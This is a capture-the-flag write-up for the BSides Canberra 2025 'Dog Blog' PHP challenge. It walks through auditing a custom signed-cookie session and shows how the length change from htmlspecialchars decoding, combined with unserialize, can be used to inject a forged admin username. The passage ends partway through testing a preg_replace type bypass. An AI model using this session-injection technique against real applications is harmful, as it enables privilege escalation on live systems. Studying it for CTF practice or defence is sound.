
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
	<link href='https://fonts.googleapis.com/css?family=JetBrains Mono' rel='stylesheet'>
	<title>BSides Canberra 2025 - Dog Blog (5 Solves)</title>
  </head>
  <body>
	<div class="content-container">
		<div class="text-container">
			<h1>Dog Blog (5 Solves)</h1>
<p>Getting started, we're given the following source files.</p>
<pre class="language-bash"><code class="language-bash">├── Dockerfile
└── www
    ├── config.yaml
    ├── html
    │   ├── admin.php
    │   ├── article.php
    │   ├── index.php
    │   ├── login.php
    │   └── logout.php
    ├── lib
    │   ├── auth.php
    │   ├── bootstrap.php
    │   ├── sessions.php
    │   └── translate.php
    └── tmpl
        ├── admin.tmpl.php
        ├── article.1.tmpl.php
        ├── article.2.tmpl.php
        ├── footer.tmpl.php
        ├── header.tmpl.php
        ├── index.tmpl.css
        ├── index.tmpl.php
        └── login.tmpl.php

<span class="token number">5</span> directories, <span class="token number">19</span> files</code></pre>
<p>As with any CTF challenge, we'll start by getting an understanding of where the flag is. This will give us a better understanding of what we'll need to exploit in order to solve the challenge.</p>
<p>In the <code>www/config.yaml</code> file we find the flag being defined.</p>
<pre class="language-yaml"><code class="language-yaml"><span class="token key atrule">users</span><span class="token punctuation">:</span>
  <span class="token comment"># guest has password 'guest'</span>
  <span class="token key atrule">guest</span><span class="token punctuation">:</span> $2y$10$dR612s6PQNaNvA6YLqqqQ.gACv5wLmA5iDzqmLRuGeDCwJaqxzCXi
  <span class="token comment"># admin has unguessable password :(</span>
  <span class="token key atrule">admin</span><span class="token punctuation">:</span> XXX

<span class="token comment"># secret key and flag are also unguessable :(</span>
<span class="token key atrule">secret_key</span><span class="token punctuation">:</span> XXX
<span class="token key atrule">flag</span><span class="token punctuation">:</span> XXX

<span class="token key atrule">translations</span><span class="token punctuation">:</span>
  <span class="token key atrule">en</span><span class="token punctuation">:</span>
    <span class="token key atrule">BLOG_TITLE</span><span class="token punctuation">:</span> <span class="token string">'dog blog'</span>
    <span class="token key atrule">BLOG_VIEW</span><span class="token punctuation">:</span> <span class="token string">'view blog'</span>
    <span class="token key atrule">BLOG_LOGOUT</span><span class="token punctuation">:</span> <span class="token string">'logout'</span></code></pre>
<p>The only other mention of the flag is in <code>www/tmpl/admin.tmpl.php</code>.</p>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">require</span> <span class="token string single-quoted-string">'header.tmpl.php'</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'BLOG_TITLE'</span><span class="token punctuation">)</span> <span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>welcome-message<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
            <span class="token php language-php"><span class="token delimiter important">&lt;?=</span> <span class="token function">dog_is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token function">T</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'BLOG_ADMIN_WELCOME'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span> 
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>
<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">require</span> <span class="token string single-quoted-string">'footer.tmpl.php'</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span></code></pre>
<p>This already gives us the following information:</p>
<ul>
<li>We need <code>dog_is_admin()</code> to return <code>True</code> if we want easy access to the flag.</li>
<li>Guessing the admin password or the <code>secret_key</code> is not a viable way forward (if we're trusting the authors comments, which we will for now).</li>
</ul>
<p>The <code>dog_is_admin()</code> function checks that our username is <code>admin</code>, as below.</p>
<pre class="language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">dog_is_admin</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<h2>Identifying interesting functionality</h2>
<p>Now before we get too carried away, I'd typically want to make sure I understand how the application routes requests, but at a glance it already seems like it will be quite simple. I'll list some quick assumptions:</p>
<ul>
<li>We can request any page under <code>www/html/</code>, e.g. <code>www/html/login.php</code>.</li>
<li>Those pages will make use of the <code>www/lib/</code> files for general functionality.</li>
<li>They'll also use pages under <code>www/tmpl/</code> for additional page content.</li>
</ul>
<p>So with that context, we can assume that the <code>www/tmpl/admin.tmpl.php</code> content will be rendered when visiting <code>admin.php</code>, which we can see is the case in the below snippet of the <code>admin.php</code> source code.</p>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'../lib/bootstrap.php'</span><span class="token punctuation">;</span>

<span class="token function">dog_session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">dog_change_language</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token function">dog_session_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">dog_is_logged_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">header</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Location: /login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">die</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">require_once</span> <span class="token string single-quoted-string">'../tmpl/admin.tmpl.php'</span><span class="token punctuation">;</span>
</span></code></pre>
<p>Note that before we reach <code>www/tmpl/admin.tmpl.php</code> we first encounter the following interesting functions:</p>
<ul>
<li><code>dog_session_start()</code></li>
<li><code>dog_change_language()</code></li>
<li><code>dog_session_end()</code></li>
</ul>
<p>We don't flag <code>dog_is_logged_in()</code> as particularly interesting here since its very simple and just checks that our current session has a <code>username</code> field defined:</p>
<pre class="language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">dog_is_logged_in</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>The functions that we did raise as interesting are a bit more complex, and are defined in <code>www/lib/sessions.php</code> and <code>www/lib/translate.php</code> as below.</p>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">dog_session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOGSESSION'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment"># 1</span>
		 <span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'DOGSESSION'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token variable">$sig</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret_key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token variable">$sig</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment"># 2</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">htmlspecialchars_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment"># 3</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">dog_session_end</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># 4</span>
	<span class="token variable">$sig</span> <span class="token operator">=</span> <span class="token function">hash_hmac</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'md5'</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'secret_key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'DOGSESSION'</span><span class="token punctuation">,</span> <span class="token variable">$sig</span> <span class="token operator">.</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</span></code></pre>
<pre class="language-php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token keyword">function</span> <span class="token function-definition function">T</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span> <span class="token operator">??</span> <span class="token string single-quoted-string">'en'</span><span class="token punctuation">;</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">,</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'translations'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'en'</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>
	<span class="token keyword">return</span> <span class="token constant">CONFIG</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'translations'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$lang</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$code</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">dog_valid_language</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$lang</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">function</span> <span class="token function-definition function">dog_change_language</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$lang</span> <span class="token operator">=</span> <span class="token function">dog_valid_language</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'lang'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$lang</span><span class="token punctuation">;</span> <span class="token comment"># 5</span>
	<span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</span></code></pre>
<p>Since there's not a lot of code here and it's all related to the <code>admin.php</code> page (where our flag is), we want to audit this code very closely. Starting with <code>dog_session_start()</code>, we note that:</p>
<ul>
<li>The cookie that stores our session information is named <code>DOGSESSION</code>. (# 1, referring to the line in the code snippet marked as # 1)</li>
<li>The session cookie is comprised of a signature (<code>$sig</code>) and associated data (<code>$data</code>). (# 2)</li>
<li>Our internal session is determined by the data (<code>$data</code>) in our cookie. Note in particular that the data is first processed using <code>htmlspecialchars_decode</code> before being <code>unserialize</code>d and then stored. (# 3)</li>
</ul>
<p>Moving onto <code>dog_session_end()</code>, we see that generating the data (<code>$data</code>) for our session involves <code>serialize</code>ing our currently stored session (<code>$_SESSION</code>) and using <code>htmlspecialchars</code> on the result (# 4).</p>
<p>Finally, the <code>dog_change_language()</code> function takes a language (<code>$lang</code>), removes any characters that don't match <code>/[^a-z]/</code> (lowercase alphabet), and then sets it as our language setting in our session (<code>$_SESSION['lang']</code>).</p>
<p>To give all that analysis some context, see the following snippets that show our <code>DOGSESSION</code> cookie being set after we change our language.</p>
<h4>request</h4>
<pre class="language-http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/admin?lang=abc</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">web-dog-blog-d4cd3a85c452.c.sk8.dog</span></span>
...snip...</code></pre>
<h4>Response</h4>
<pre class="language-http"><code class="language-http"><span class="token response-status"><span class="token http-version property">HTTP/1.1</span> <span class="token status-code number">200</span> <span class="token reason-phrase string">OK</span></span>
<span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">DOGSESSION=bd5aa21201c134fba04cba768d5b64a8a%3A2%3A%7Bs%3A4%3A%26quot%3Blang%26quot%3B%3Bs%3A3%3A%26quot%3Babc%26quot%3B%3Bs%3A8%3A%26quot%3Busername%26quot%3B%3Bs%3A5%3A%26quot%3Bguest%26quot%3B%3B%7D</span></span>
...snip...</code></pre>
<p>URL decoding the cookie gives us:</p>
<pre class="language-javascript"><code class="language-javascript"><span class="token literal-property property">bd5aa21201c134fba04cba768d5b64a8a</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>lang<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>abc<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>username<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token operator">&amp;</span>quot<span class="token punctuation">;</span>guest<span class="token operator">&amp;</span>quot<span class="token punctuation">;</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<p>Which HTML decodes to:</p>
<pre class="language-javascript"><code class="language-javascript"><span class="token literal-property property">bd5aa21201c134fba04cba768d5b64a8a</span><span class="token operator">:</span><span class="token number">2</span><span class="token operator">:</span><span class="token punctuation">{</span><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">4</span><span class="token operator">:</span><span class="token string">"lang"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">3</span><span class="token operator">:</span><span class="token string">"abc"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">8</span><span class="token operator">:</span><span class="token string">"username"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">5</span><span class="token operator">:</span><span class="token string">"guest"</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>
<h2>Coming up with an idea</h2>
<p>With so much of this functionality centering around a strange custom session implementation, and our main path to the flag being the <code>dog_is_admin()</code> session check, it is reasonable to assume there's a bug in the functions we've just reviewed. We can also guess that whatever the bug is, it will let us set the <code>username</code> attribute of our session to <code>admin</code>.</p>
<p>Starting with these assumptions, the following lines from <code>dog_session_start()</code> and <code>dog_session_end()</code> seem most likely to introduce the behaviour we're looking for [*1].</p>
<pre class="language-php"><code class="language-php"><span class="token variable">$_SESSION</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">htmlspecialchars_decode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">?</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment"># dog_session_start()</span>

<span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># dog_session_end()</span></code></pre>
<p>As we covered before, the first line reads serialised <code>$data</code> from our <code>DOGSESSION</code> cookie, and the second line sets the <code>DOGSESSION</code> cookie based on our internal <code>$_SESSION</code>. The key idea that makes these lines interesting comes from their use of <code>htmlspecialchars()</code> and <code>htmlspecialchars_decode()</code>. Since PHP serialisation relies a lot on knowing the length of a value, if there's inconsistencies between the length of a value when it is decoded vs when it was encoded, then we could start tampering with the final deserialisation.</p>
<p>To illustrate this idea, consider the following string moving through the <code>dog_session_end()</code> process.</p>
<pre class="language-js"><code class="language-js"><span class="token string">"A"</span> <span class="token operator">-</span><span class="token operator">></span> serialise <span class="token operator">-</span><span class="token operator">></span> s<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token string">"A"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">HTML</span> Encode <span class="token operator">-</span><span class="token operator">></span> s<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token string">"&amp;#65;"</span></code></pre>
<p>We'll then move it through the <code>dog_session_start()</code> process, but assume that HTML decoding <code>&amp;#65;</code> would produce <code>AAA</code> instead of <code>A</code>.</p>
<pre class="language-js"><code class="language-js"><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token string">"&amp;#65;"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">HTML</span> Decode <span class="token operator">-</span><span class="token operator">></span> s<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token string">"AAA"</span> <span class="token operator">-</span><span class="token operator">></span> deserialise <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">ERROR</span><span class="token operator">!</span></code></pre>
<p>So if this was possible, we could inject two additional characters into a string that is assumed to be one character in length. By using multiple <code>A</code> characters (still assuming it would produce <code>AAA</code>), we could expand on this idea to escape from the serialised string structure.</p>
<pre class="language-js"><code class="language-js"><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">6</span><span class="token operator">:</span><span class="token string">"&amp;#65;&amp;#65;&amp;quot;&amp;#65;&amp;#65;&amp;#65;"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">HTML</span> Decode <span class="token operator">-</span><span class="token operator">></span> s<span class="token operator">:</span><span class="token number">6</span><span class="token operator">:</span><span class="token string">"AAAAAA"</span><span class="token constant">AAAAAAAAA</span>" <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">ERROR</span><span class="token operator">!</span></code></pre>
<p>Finally, we could use this to inject new structures beyond the string, making the deserialisation successful again.</p>
<pre class="language-js"><code class="language-js"><span class="token literal-property property">s</span><span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span><span class="token string">"&amp;#65;&amp;#65;&amp;#65;&amp;#65;&amp;quot;&amp;semi;s:1:&amp;quot;A"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">HTML</span> Decode <span class="token operator">-</span><span class="token operator">></span> s<span class="token operator">:</span><span class="token number">12</span><span class="token operator">:</span><span class="token string">"AAAAAAAAAAAAAAA"</span><span class="token punctuation">;</span>s<span class="token operator">:</span><span class="token number">1</span><span class="token operator">:</span><span class="token string">"A"</span> <span class="token operator">-</span><span class="token operator">></span> Successful deserialisation</code></pre>
<p>Note that the the initial serialised string was <code>AAAA&quot;;s:1&quot;A</code> (HTML encoded in the above excerpt), but when decoded and deserialised it resulted in the creation of two separate strings, <code>AAAAAAAAAAAA</code> and <code>A</code>. If we could make this work in the challenge, we could try to inject a <code>username</code> field instead of a simple string. This would let us set our username to <code>admin</code> and pass the <code>dog_is_admin()</code> check!</p>
<h2>Testing the idea</h2>
<p>To figure out whether this idea is possible, we can write a small script to compare the length of a character after encoding/decoding with <code>htmlspecialchars()</code> and <code>htmlspecialchars_decode()</code>.</p>
<pre class="language-php"><code class="language-php"><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token number">0xFF</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">chr</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$length</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment"># should always be 1</span>
        <span class="token variable">$length_encode_decode</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">htmlspecialchars_decode</span><span class="token punctuation">(</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$length_encode_decode</span> <span class="token operator">!=</span> <span class="token variable">$length</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" of length "</span> <span class="token operator">.</span> <span class="token variable">$length</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" decoded to length "</span> <span class="token operator">.</span> <span class="token variable">$length_encode_decode</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
<span class="token punctuation">}</span></code></pre>
<p>Running this script, we actually get a lot of hits!</p>
<pre class="language-js"><code class="language-js"><span class="token operator">...</span>snip<span class="token operator">...</span>
fc <span class="token keyword">of</span> length <span class="token number">1</span> decoded to length <span class="token number">3</span>
fd <span class="token keyword">of</span> length <span class="token number">1</span> decoded to length <span class="token number">3</span>
fe <span class="token keyword">of</span> length <span class="token number">1</span> decoded to length <span class="token number">3</span>
ff <span class="token keyword">of</span> length <span class="token number">1</span> decoded to length <span class="token number">3</span>
</code></pre>
<p>Note as well that the conversion from a length of one to a length of three matches our theoretical <code>A</code> to <code>AAA</code> scenario.</p>
<h2>One more problem</h2>
<p>This means our attack idea may be possible, but we've got one more problem to address. The only field in our session that we control is <code>lang</code>, but the <code>dog_valid_language()</code> function that runs against our <code>lang</code> input removes any character that isn't a lowercase letter.</p>
<pre class="language-php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">dog_valid_language</span><span class="token punctuation">(</span><span class="token variable">$lang</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^a-z]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$lang</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span></code></pre>
<p>Unfortunately, none of the characters found by our script are a simple lowercase letter, so they'd all get removed by this sanitisation. To figure out a way around this, we could experiment with how <code>preg_replace</code> works on different data types, since there doesn't apppear to be any type checks for <code>lang</code>. The following excerpt shows a script that tests <code>preg_replace</code> on a keyed array.</p>
<pre class="language-php"><code class="language-php"><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"testing!"</span><span class="token punctuation">;</span>
<span class="token variable">$b</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"testing!"</span> <span class="token operator">=></span> <span class="token string double-quoted-string">"testing!"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z]/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^a-z]/"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>Running this, we get the following output.</p>
<pre class="language-php"><code class="language-php"><span class="token keyword type-declaration">string</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token string double-quoted-string">"testing"</span>
<span class="token keyword">array</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token punctuation">[</span><span class="token string double-quoted-string">"testing!"</span><span class="token punctuation">]</span><span class="token operator">=></span>
